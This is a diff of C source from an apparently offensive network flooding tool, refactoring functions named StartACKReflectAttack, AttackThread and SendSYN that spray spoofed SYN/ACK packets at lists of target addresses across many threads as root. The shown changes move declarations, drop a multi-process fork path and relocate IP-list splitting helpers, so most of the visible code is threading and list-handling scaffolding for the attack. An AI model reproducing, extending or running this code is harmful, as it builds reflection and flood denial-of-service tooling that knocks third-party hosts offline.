@@ -13,7 +13,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#include <string.h>
 #include <unistd.h>
 #include <pthread.h>
 #include <sys/wait.h>
@@ -33,6 +32,13 @@ extern void FreeProcessACKIPListBuff(pStrHeader p);
 extern pStrHeader ProcessACKIPListFile(pStrHeader *output);
 extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
 extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);
+
+extern void FreeSplitURLBuff(pSplitURLOutput p);
+extern int SplitURL(const char *url, pSplitURLOutput *output);
+extern void SignalExit(int signo);
+
+extern pIPList_Thread SplitIPForThread(pIPList_Thread *output, const pInput input, const pStrHeader str_header);
+extern void FreeIPListBuff(pIPList_Thread input);
 
 static int SendSYN(const pSYNStruct ss, const int debug_level)
 {
@@ -199,8 +205,6 @@ static int AttackThread(pSYNStruct syn_struct)
     pSplitURLOutput split_result;
 
     DisplayDebug(DEBUG_LEVEL_3, syn_struct->debug_level, "AttackThread start sending data...");
-    extern void FreeSplitURLBuff(pSplitURLOutput p);
-    extern int SplitURL(const char *url, pSplitURLOutput *output);
 
     while (str_node)
     {
@@ -250,7 +254,7 @@ static int AttackThread(pSYNStruct syn_struct)
         FreeSplitURLBuff(split_result);
 
         // for test
-        DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);
+        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);
 
         for (i = 0; i < syn_struct->each_ip_repeat; i++)
         {
@@ -266,116 +270,16 @@ static int AttackThread(pSYNStruct syn_struct)
     return 0;
 }
 
-static pIPList_Thread SplitIPForThread(pIPList_Thread *output, const pInput input, const pStrHeader str_header)
-{
-    // split the whole ip list for each thread
-    size_t thread_num = input->max_thread;
-    size_t list_length = str_header->length;
-    size_t i, j;
-    size_t cut = list_length / thread_num;
-    pStrHeader str_new_header;
-
-    (*output) = (pIPList_Thread)malloc(sizeof(IPList_Thread));
-    if (!(*output))
-    {
-        DisplayError("SplitIPForThread malloc failed: %s(%d)", strerror(errno), errno);
-        return (pIPList_Thread)NULL;
-    }
-    pIPList_Thread ip_new_node = (*output);
-
-    // the list is too short to split for each thread
-    // so just use the whole list for all the threads
-    if (cut < 1)
-    {
-        DisplayWarning("The IP list did NOT need the split");
-
-        for (i = 0; i < thread_num; i++)
-        {
-            str_new_header = str_header;
-            ip_new_node->list = str_new_header;
-            ip_new_node->next = (pIPList_Thread)malloc(sizeof(IPList_Thread));
-            if (!ip_new_node)
-            {
-                DisplayError("SplitIPForThread malloc failed: %s(%d)", strerror(errno), errno);
-                return (pIPList_Thread)NULL;
-            }
-            ip_new_node->next = (pIPList_Thread)malloc(sizeof(IPList_Thread));
-            ip_new_node = ip_new_node->next;
-        }
-
-        return (*output);
-    }
-
-    pStrNode tmp_node = str_header->next;
-    pStrNode next_tmp_node;
-    // deal with the data except the last one
-    for (i = 0; i < thread_num - 1; i++)
-    {
-        str_new_header = (pStrHeader)malloc(sizeof(StrHeader));
-        str_new_header->next = tmp_node;
-        str_new_header->length = 0;
-
-        // move the tmp_node to the right position
-        for (j = 0; j < cut; j++)
-        {
-            tmp_node = tmp_node->next;
-            ++(str_new_header->length);
-        }
-        // use the next_tmp_node as the bridge
-        next_tmp_node = tmp_node->next;
-        // cut the node
-        tmp_node->next = NULL;
-        tmp_node = next_tmp_node;
-
-        ip_new_node->list = str_new_header;
-        ip_new_node->next = (pIPList_Thread)malloc(sizeof(IPList_Thread));
-        ip_new_node = ip_new_node->next;
-    }
-
-    // deal with the last one's data
-    str_new_header = (pStrHeader)malloc(sizeof(StrHeader));
-    str_new_header->next = tmp_node;
-    str_new_header->length = 0;
-
-    while (tmp_node)
-    {
-        tmp_node = tmp_node->next;
-        ++(str_new_header->length);
-    }
-    ip_new_node->list = str_new_header;
-    ip_new_node->next = NULL;
-
-    return (*output);
-}
-
-static void FreeIPListBuff(pIPList_Thread input)
-{
-    // free the buff
-    pIPList_Thread tmp = input;
-    if (tmp->next)
-    {
-        FreeIPListBuff(tmp->next);
-    }
-    free(tmp->list);
-    free(tmp);
-}
-
 int StartACKReflectAttack(const pInput input)
 {
     // run function in thread
     // this attack type must run as root
 
-    pid_t pid, wpid;
     pthread_t tid[input->max_thread];
     pthread_attr_t attr;
-    int i, j, ret;
-    int status = 0;
+    int j, ret;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
-    extern void FreeSplitURLBuff(pSplitURLOutput p);
-    extern int SplitURL(const char *url, pSplitURLOutput *output);
-    extern void SignalExit(int signo);
-
     signal(SIGINT, SignalExit);
     // syn_struct will into the AttackThread function
     pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
@@ -446,114 +350,55 @@ int StartACKReflectAttack(const pInput input)
     {
         // only one process
         tmp_list = list;
-        if (input->max_process <= 1)
+        // start again
+        for (j = 0; j < input->max_thread; j++)
         {
-            // start again
-            for (j = 0; j < input->max_thread; j++)
-            {
-                /* 
+            /* 
                  * every thread has onlyone target address
                  * thread end try next address
                  */
-                syn_struct->str_header = tmp_list->list;
-                tmp_list = tmp_list->next;
-                //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);
+            syn_struct->str_header = tmp_list->list;
+            tmp_list = tmp_list->next;
+            //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);
 
-                //input->serial_num = (i * input->max_thread) + j;
-                if (pthread_attr_init(&attr))
-                {
-                    DisplayError("StartSYNFlood pthread_attr_init failed");
-                    return 1;
-                }
-                //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
-                if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
-                {
-                    DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
-                    return 1;
-                }
-                // create thread
-                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
-                //printf("j is: %d\n", j);
-                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
-                // here we make a map
-                if (ret != 0)
-                {
-                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-                    DisplayError("Create pthread failed");
-                    return 1;
-                }
-                pthread_attr_destroy(&attr);
-                // for the test
-                // also for the each thread ready
-                sleep(1);
-            }
-            //pthread_detach(tid);
-            // join them all
-            for (j = 0; j < input->max_thread; j++)
+            //input->serial_num = (i * input->max_thread) + j;
+            if (pthread_attr_init(&attr))
             {
-                pthread_join(tid[j], NULL);
+                DisplayError("StartSYNFlood pthread_attr_init failed");
+                return 1;
             }
-            // exit for test
-            //return 0;
+            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
+            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
+            {
+                DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
+                return 1;
+            }
+            // create thread
+            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
+            //printf("j is: %d\n", j);
+            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+            // here we make a map
+            if (ret != 0)
+            {
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+                DisplayError("Create pthread failed");
+                return 1;
+            }
+            pthread_attr_destroy(&attr);
+            // for the test
+            // also for the each thread ready
+            sleep(1);
         }
-        // many process: actually this is not neccessary
-        else
+        //pthread_detach(tid);
+        // join them all
+        for (j = 0; j < input->max_thread; j++)
         {
-            // muti process
-            for (i = 0; i < input->max_process; i++)
-            {
-                pid = fork();
-                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
-                if (pid == 0)
-                {
-                    // child process
-                    for (j = 0; j < input->max_thread; j++)
-                    {
-                        //input->serial_num = (i * input->max_thread) + j;
-                        if (pthread_attr_init(&attr))
-                        {
-                            DisplayError("StartSYNFlood pthread_attr_init failed");
-                            return 1;
-                        }
-                        //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
-                        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
-                        {
-                            DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
-                            return 1;
-                        }
-                        // create thread
-                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
-                        //printf("j is: %d\n", j);
-                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
-                        // here we make a map
-                        if (ret != 0)
-                        {
-                            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
-                            DisplayError("Create pthread failed");
-                            return 1;
-                        }
-                        pthread_attr_destroy(&attr);
-                    }
-                    //pthread_detach(tid);
-                    // join them all
-                    for (j = 0; j < input->max_thread; j++)
-                    {
-                        pthread_join(tid[j], NULL);
-                    }
-                }
-                else if (pid < 0)
-                {
-                    DisplayError("Create process failed");
-                }
-                // Father process
-                while ((wpid = wait(&status)) > 0)
-                {
-                    // nothing here
-                    // wait the child process end
-                }
-            }
+            pthread_join(tid[j], NULL);
         }
+        // exit for test
+        //return 0;
     }
+    // many process: actually this is not neccessary
     FreeSYNStructBuff(syn_struct);
     FreeIPListBuff(list);
     return 0;
@@ -564,9 +409,6 @@ int StartACKReflectTest(const pInput input)
     // run function in thread
     // this attack type must run as root
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
-    extern void FreeSplitURLBuff(pSplitURLOutput p);
-    extern int SplitURL(const char *url, pSplitURLOutput *output);
-    extern void SignalExit(int signo);
 
     signal(SIGINT, SignalExit);
     // syn_struct will into the AttackThread function
@@ -631,8 +473,9 @@ int StartACKReflectTest(const pInput input)
         return 1;
     }
     pIPList_Thread tmp_list = list;
-    int i;
+    free(str_header);
 
+    int i;
     for (i = 0; i < input->max_thread; i++)
     {
         syn_struct->str_header = tmp_list->list;
